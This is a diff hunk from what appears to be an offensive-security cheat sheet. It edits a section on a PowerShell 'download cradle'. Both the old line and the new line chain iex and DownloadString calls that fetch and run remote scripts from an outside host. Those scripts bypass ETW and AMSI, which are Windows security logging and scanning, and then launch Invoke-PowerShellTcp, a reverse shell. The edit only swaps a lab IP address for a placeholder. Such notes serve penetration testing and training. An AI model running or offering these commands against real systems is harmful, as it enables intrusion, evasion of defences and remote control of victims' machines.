@@ -136,7 +136,7 @@ iex (New-Object Net.WebClient).DownloadString('http://xx.xx.xx.xx/payload.ps1')
 
 #### Full cradle with ETW and AMSI bypass download
 ```
-powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://172.16.100.44:8080/etw.txt'); iex (New-Object Net.WebClient).DownloadString('http://172.16.100.44:8080/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://172.16.100.44:8080/Invoke-PowerShellTcpEx.ps1')
+powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x/etw.txt'); iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1')
 ```
 
 #### Others
